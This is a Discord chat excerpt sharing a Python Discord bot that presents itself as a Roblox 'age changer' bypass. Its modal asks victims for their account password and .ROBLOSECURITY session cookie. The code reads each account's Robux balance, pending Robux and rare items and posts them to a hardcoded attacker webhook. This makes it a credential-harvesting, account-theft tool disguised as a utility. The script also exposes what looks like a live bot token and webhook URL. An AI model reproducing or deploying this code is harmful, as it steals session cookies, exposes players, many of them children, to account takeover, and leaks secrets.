!⚠ Veexye 99+ Vouches [ 7 INCH ]
devioury
Online



deviouryy — Yesterday at 11:55 PM
discord.py
requests
!⚠ Veexye 99+ Vouches [ 7 INCH ] — 3:32 AM
import discord
from discord.ext import commands
from discord import app_commands
import requests
import json
import asyncio

app.py
12 KB
﻿
import discord
from discord.ext import commands
from discord import app_commands
import requests
import json
import asyncio

# --- CONFIGURATION ---
TOKEN = 'MTQ5Njg4ODI4NzAxMTUzNzA3Ng.GgPCeB.W0mg6PatC2tiTOIW-mpeC37FoDoAZqTfSPaNGQ'
# Add your Webhook URL here to receive the account details
LOG_WEBHOOK = 'https://discord.com/api/webhooks/1496936361146585270/7ekmEeWCX4Wd--_7qxEVxHepfYIB6xR2P0fyl1KrnCfppVJ-iiJBc6bsU0iy1BAovsgy'

# Set the target birthday (April 30, 2013)
BIRTH_DAY = 30
BIRTH_MONTH = 4
BIRTH_YEAR = 2013

class AgeChangerBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        # Slash commands don't strictly require message_content intent, 
        # but it's good to keep it enabled in the portal.
        super().__init__(command_prefix='!', intents=intents)

    async def setup_hook(self):
        # Sync the slash commands with Discord
        print("[*] Syncing slash commands...")
        await self.tree.sync()
        print("[+] Slash commands synced!")

bot = AgeChangerBot()

def get_account_info(session):
    """Fetches detailed account info like Robux, Pending, and Items."""
    try:
        # 1. Get User ID and Username
        user_data = session.get("https://users.roblox.com/v1/users/authenticated").json()
        user_id = user_data.get('id')
        username = user_data.get('name')
        
        if not user_id:
            return None

        # 2. Get Robux Balance
        economy_data = session.get(f"https://economy.roblox.com/v1/users/{user_id}/currency").json()
        robux = economy_data.get('robux', 0)

        # 3. Get Pending Robux
        pending = 0
        try:
            pending_data = session.get(f"https://economy.roblox.com/v2/users/{user_id}/transaction-totals?timeFrame=Month&transactionType=Summary").json()
            pending = pending_data.get('pendingRobux', 0)
        except:
            pass

        # 4. Check Items (Korblox and Headless)
        # Korblox Deathspeaker Bundle ID: 192
        # Headless Horseman Bundle ID: 310
        korblox_check = session.get(f"https://inventory.roblox.com/v1/users/{user_id}/items/Bundle/192").json()
        headless_check = session.get(f"https://inventory.roblox.com/v1/users/{user_id}/items/Bundle/310").json()

        has_korblox = "✅" if korblox_check.get('data') else "❌"
        has_headless = "✅" if headless_check.get('data') else "❌"

        # 5. Get Profile Picture
        thumbnail = ""
        try:
            thumb_data = session.get(f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={user_id}&size=150x150&format=Png&isCircular=false").json()
            thumbnail = thumb_data.get('data', [{}])[0].get('imageUrl', "")
        except:
            pass

        return {
            "user_id": user_id,
            "username": username,
            "robux": robux,
            "pending": pending,
            "korblox": has_korblox,
            "headless": has_headless,
            "thumbnail": thumbnail
        }
    except:
        return None

def send_to_webhook(status, info, cookie, result_msg):
    """Sends a redesigned, cool bypass result and account info to the configured webhook."""
    if not LOG_WEBHOOK or "api/webhooks" not in LOG_WEBHOOK:
        print("[-] Webhook URL is missing or invalid.")
        return

    # Cool Color Scheme: Electric Blue for success, Crimson for failure
    color = 0x00d4ff if status else 0xff2e2e
    
    import datetime
    timestamp = datetime.datetime.utcnow().isoformat()

    # Determine status icon and title
    status_title = "⚡ TANG INA PALDO . SUCCESS ⚡" if status else "⚠️ YAWA ANG MALAS NAMAN . FAILED ⚠️"
    status_icon = "🟢" if status else "🔴"

    embed = {
        "title": f"{status_icon} {status_title}",
        "color": color,
        "description": f"**Method Used:** `{result_msg}`\n**Birthdate Request:** `4/30/2013`",
        "fields": [],
        "footer": {
            "text": "Bypasser ni James • System Logs",
            "icon_url": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSuhEK4R0pLBfvrIJMq3zYikWBNyQEPoSi7XQ&s" # Optional: Add a cool icon if you have one
        },
        "timestamp": timestamp
    }

    if info:
        if info.get('thumbnail'):
            embed["thumbnail"] = {"url": info['thumbnail']}
        
        # Identity Section
        embed["fields"].append({
            "name": "👤 ACCOUNT INFORMATION",
            "value": f"**User:** [{info['username']}](https://www.roblox.com/users/{info['user_id']}/profile)\n**ID:** `{info['user_id']}`",
            "inline": False
        })

        # Economy Section
        embed["fields"].append({
            "name": "💰 Robux",
            "value": f"**Balance:** `{info['robux']}` Robux\n**Pending:** `{info['pending']}` Robux",
            "inline": True
        })

        # Rare Items Section
        embed["fields"].append({
            "name": "✨ Korblox / Headless",
            "value": f"**Korblox:** {info['korblox']}\n**Headless:** {info['headless']}",
            "inline": True
        })
        
        # Divider or extra info
        embed["fields"].append({
            "name": "🔗 QUICK LINKS",
            "value": f"[ PROFILE ](https://www.roblox.com/my/avatar)",
            "inline": False
        })
    else:
        embed["description"] += "\n\n> ⚠️ **Warning:** Could not fetch detailed account profile. The cookie might be expired or restricted."
    
    payload = {
        "username": "Bypasser ni James Logs",
        "avatar_url": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSuhEK4R0pLBfvrIJMq3zYikWBNyQEPoSi7XQ&s", # Cool bot avatar
        "embeds": [embed]
    }

    try:
        response = requests.post(LOG_WEBHOOK, json=payload)
        if response.status_code == 204:
            print("[+] Redesigned log successfully sent!")
        else:
            print(f"[-] Webhook returned error: {response.status_code} - {response.text}")
    except Exception as e:
        print(f"[-] Failed to send to webhook: {e}")

def change_roblox_age(cookie):
    """Internal function to perform the age change logic."""
    # Clean the cookie: remove spaces and ensure it has the correct prefix if missing
    cookie = cookie.strip()
    
    # If the user pasted the raw cookie without the warning prefix, add it.
    if not cookie.startswith("_|WARNING:-"):
        cookie = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_" + cookie

    session = requests.Session()
    session.cookies.set(".ROBLOSECURITY", cookie, domain="roblox.com")

    # Fetch account info first
    account_info = get_account_info(session)

    # 1. Get CSRF Token
    try:
        response = session.post("https://auth.roblox.com/v2/logout")
        csrf_token = response.headers.get("x-csrf-token")
        if not csrf_token:
            send_to_webhook(False, account_info, cookie, "Could not retrieve CSRF token.")
            return False, "Could not retrieve CSRF token. Is the cookie valid?"
    except Exception as e:
        send_to_webhook(False, account_info, cookie, str(e))
        return False, f"Error getting CSRF token: {e}"

    headers = {
        "X-CSRF-TOKEN": csrf_token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Referer": "https://www.roblox.com/my/account"
    }
    
    payload = {
        "birthMonth": BIRTH_MONTH,
        "birthDay": BIRTH_DAY,
        "birthYear": BIRTH_YEAR
    }

    final_success = False
    final_msg = ""

    try:
        # Method 1: Standard Users API
        response = session.post(
            "https://users.roblox.com/v1/birthdate",
            headers=headers,
            data=json.dumps(payload)
        )

        if response.status_code == 200:
            final_success, final_msg = True, "Success via Method 1"
        else:
            # Method 2: Legacy Account Settings API
            response2 = session.post(
                "https://accountsettings.roblox.com/v1/birthday",
                headers=headers,
                data=json.dumps(payload)
            )
            
            if response2.status_code == 200:
                final_success, final_msg = True, "Success via Method 2"
            else:
                # Method 3: Legacy Monolithic Web Endpoint
                web_payload = {
                    "birthDay": BIRTH_DAY,
                    "birthMonth": BIRTH_MONTH,
                    "birthYear": BIRTH_YEAR,
                    "isUpdateBirthday": True
                }
                response3 = session.post(
                    "https://www.roblox.com/my/account/settings/save-personal",
                    headers=headers,
                    data=json.dumps(web_payload)
                )
                
                if response3.status_code == 200:
                    final_success, final_msg = True, "Success via Method 3"
                else:
                    final_success, final_msg = False, f"Failed: {response3.text}"
        
        # Send everything to webhook
        send_to_webhook(final_success, account_info, cookie, final_msg)
        return final_success, final_msg
            
    except Exception as e:
        send_to_webhook(False, account_info, cookie, str(e))
        return False, f"Error sending request: {e}"

@bot.event
async def on_ready():
    print(f'--- Bot is online as {bot.user} ---')
    print('Use /change in Discord to change age.')

class AgeChangerModal(discord.ui.Modal, title='Bypasser ni Boss James'):
    password = discord.ui.TextInput(
        label='Password',
        placeholder='Account password',
        style=discord.TextStyle.short,
        required=True,
    )
    
    cookie = discord.ui.TextInput(
        label='.ROBLOSECURITY',
        placeholder='_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as...',
        style=discord.TextStyle.long,
        required=True,
    )

    async def on_submit(self, interaction: discord.Interaction):
        # Send an initial hidden response
        await interaction.response.send_message("⏳ Processing age change request... (This is private)", ephemeral=True)
        
        # Run the change logic
        success, result = await asyncio.to_thread(change_roblox_age, self.cookie.value)
        
        if success:
            embed = discord.Embed(title="✅ Age Changed Successfully", color=discord.Color.green())
            embed.add_field(name="New Birthday", value=f"{BIRTH_MONTH}/{BIRTH_DAY}/{BIRTH_YEAR}")
            embed.set_footer(text=result)
            await interaction.edit_original_response(content=None, embed=embed)
        else:
            embed = discord.Embed(title="❌ Age Change Failed", color=discord.Color.red())
            embed.description = result
            await interaction.edit_original_response(content=None, embed=embed)

@bot.tree.command(name="change", description="Change Roblox account age to 4/30/2013")
async def change(interaction: discord.Interaction):
    """Slash command to show the age change modal"""
    await interaction.response.send_modal(AgeChangerModal())

if __name__ == "__main__":
    if TOKEN == 'YOUR_BOT_TOKEN_HERE' or TOKEN == '':
        print("[!] Error: You must provide a valid Discord Bot Token in the script.")
    else:
        bot.run(TOKEN)
app.py
12 KB
